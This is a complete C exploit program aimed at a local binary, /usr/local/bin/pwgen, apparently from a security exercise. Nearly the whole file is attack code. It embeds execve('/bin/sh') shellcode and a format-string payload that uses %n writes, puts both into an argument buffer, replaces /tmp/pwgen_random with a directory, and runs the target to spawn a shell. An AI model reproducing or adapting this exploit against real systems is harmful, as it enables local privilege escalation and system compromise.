#include <string.h>
#include <unistd.h>
#define INPUT_SIZE 255
#define TARG_FILE "/usr/local/bin/pwgen"
#define DEFAULT_BUFFER_SIZE 255
#define FILE "/tmp/pwgen_random"
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
static char f_string[] = "\x50\xd9\x41\x41\xbf\xff\x41\x41%54674x%57n%10907x%58n";
int main(int argc, char *argv[]) {
  char buffer[INPUT_SIZE]; //buffer
  int pid;
  memset(buffer, 0x41, INPUT_SIZE); //sets value 0x41 to Bsize, num of bytes starting from buff pointer
  memcpy(buffer, f_string, 30);  //adds format string 
  memcpy(buffer+128, shellcode, 45); //adds the shell code 
  buffer[254] = 0; 
  unlink(FILE); 
  mkdir(FILE, 0700);
  pid = fork();
  if (pid == -1) { 
        perror("exploit not working");
        return 0;
  } else if (pid == 0) { 
        char *args[] = { buffer, "-e", NULL };
        execv(TARG_FILE, args); 
  } else {
        waitpid(pid);
  }
  return 0;
}
